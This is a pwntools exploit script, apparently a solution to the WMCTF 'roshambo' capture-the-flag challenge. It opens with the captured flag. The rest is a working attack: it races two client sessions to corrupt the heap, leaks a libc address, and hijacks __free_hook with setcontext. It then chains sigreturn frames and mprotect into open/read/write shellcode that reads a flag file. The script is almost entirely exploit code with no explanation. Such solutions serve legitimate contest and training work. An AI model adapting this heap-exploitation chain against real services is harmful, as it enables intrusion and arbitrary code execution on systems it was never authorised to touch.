#WMCTF{sometimes_sleep_is_dangerous__babysleep}
from pwn import *
import sys,os,os.path
context.log_level='info'
context(os='linux', arch='amd64')
binary='./roshambo.dms'
elf=ELF(binary)
debug=0
if debug==0:
    io=process(binary)
    io2=process(binary)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif debug==1:
    io = remote("81.68.174.63", 64681)
    io2 = remote("81.68.174.63", 64681)
    libc = ELF("./libc.so.6")

context.terminal = ['tmux','split','-h']

s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=409600         :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
ru('Your Mode:')
sl('C')
ru('Authorization:')
sl('123')
ru('Your room: ')
room=ru('\n')
log.success(room)
ru('Your Name:')
sl('Q1IQ')

io2.recvuntil('Your Mode:')
io2.sendline('L')
io2.recvuntil('Your room:')
io2.sendline(room)
io2.recvuntil('Your Name:')
io2.sendline('Q1IQ')

# 0x20
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0))
ru(b'what do you want to say? ')
s('1\x00')

# 0x100
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0x100-8))
ru(b'what do you want to say? ')
s('1'*(0x100-8-1))


# 0x30
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0x30-8))
ru(b'what do you want to say? ')
s('1'*(0x30-8-1))


for i in range(8):
    #set has_gamestart 1
    ru('>> ')
    rpc=b'11111111'
    rpc+=p64(4)
    sl(rpc)
    #gdb.attach(io,"b *(0x555555554000+0x21c8)")

    #thread sleep 
    io2.recvuntil('>> ')
    rpc2=b'[RPC]\x00\x00\x00'
    rpc2+=p64(3)
    rpc2+=p64(0x80-8)
    rpc2=rpc2.ljust(0x30)
    rpc2+=b'name'
    io2.sendline(rpc2)


    #ptr 0x002050B8+0x555555554000
    ru('>> ')
    rpc=b'22222222'
    rpc+=p64(8)
    sl(rpc)
    ru(b'size: ')
    sl(str(0x100-8))
    ru(b'what do you want to say? ')
    sl('1'*(0x100-8-1))
    log.info('======'+str(i))
    sleep(1)


# leak
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0))
ru(b'what do you want to say? ')
s('1'*0x20)

ru('1'*0x20)
libc.address=u64(r(6).ljust(8,b'\x00'))-0x3ebd90
log.success(hex(libc.address))



#get shell
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0))
ru(b'what do you want to say? ')
s(b'1'*0x18+p64(0x91)+p64(libc.symbols['__free_hook']))



#set has_gamestart 1
ru('>> ')
rpc=b'11111111'
rpc+=p64(4)
sl(rpc)

#thread sleep 
io2.recvuntil('>> ')
rpc2=b'[RPC]\x00\x00\x00'
rpc2+=p64(3)
rpc2+=p64(0x100-8)
rpc2=rpc2.ljust(0x30)
rpc2+=b'name'
io2.sendline(rpc2)
#ptr 0x002050B8+0x555555554000
ru('>> ')
rpc=b'22222222'
rpc+=p64(8)
sl(rpc)
ru(b'size: ')
sl(str(0x30-8))
ru(b'what do you want to say? ')
sl('1'*(0x30-8-1))

sleep(1)


#set has_gamestart 1
ru('>> ')
rpc=b'/bin/sh\x00'
rpc+=p64(4)
rpc=rpc.ljust(0x38)
sigframe = SigreturnFrame()
sigframe.rdi = 0x200
sigframe.rsi = 0x200
sigframe.rdx = 7
sigframe.rsp = 0
sigframe.rip = libc.sym['sleep']
rop = bytes(sigframe)
rpc+=rop[0x38:0xc0]
sl(rpc)
#thread sleep 
io2.recvuntil('>> ')
rpc2=b'[RPC]\x00\x00\x00'
rpc2+=p64(3)
rpc2+=p64(0x100-8)
rpc2=rpc2.ljust(0x38)
onegadgets=[0x4f2c5,0x4f322,0x10a38c]

rpc2+=p64(libc.symbols['setcontext']+53)
#0 read 1 write 2 open
flag_name_addr=libc.symbols['__free_hook']+0xc0
flag_content_addr=libc.symbols['__free_hook']+0xd0 #_IO_stdin_2_1和malloc_hook之间 libc可写
arg_list = [hex(flag_name_addr),hex(flag_content_addr)]

rop_start_addr = libc.symbols['__free_hook']+8
orw=asm('''
        xor edi,edi
        mov rdi,qword ptr {0[0]}
        mov eax,2
        syscall
        mov edi,5
        mov rsi,qword ptr {0[1]}
        mov edx,0x30
        mov eax,0
        syscall
        mov edi,1
        
        mov eax,1
        syscall
        '''.format(arg_list)) #mov rsi,qword ptr {0[1]}  mov edx,0x30
log.info(len(orw))
rpc2+=orw.ljust(0x50,b'\x00')  #0x58
rpc2+=p64(rop_start_addr)#0x60
sigframe = SigreturnFrame()
sigframe.rdi = libc.address+0x3ed000
sigframe.rsi = 0x21000
sigframe.rdx = 7
sigframe.rsp = rop_start_addr+0x50
sigframe.rip = libc.sym['mprotect']
rop = bytes(sigframe)
rpc2+=rop[0x60:0xc0]
rpc2+=b'./flag\x00'

io2.sendline(rpc2)


#ptr 0x002050B8+0x555555554000
ru('>> ')
rpc=b'/bin/sh\x00'
rpc+=p64(8)
rpc=rpc.ljust(0x38)
sigframe = SigreturnFrame()
sigframe.rdi = 0x200
sigframe.rsi = 0x200
sigframe.rdx = 7
sigframe.rsp = rop_start_addr+0x50
sigframe.rip = libc.sym['sleep']
rop = bytes(sigframe)
rpc+=rop[0x38:0xc0]

sl(rpc)
io.interactive()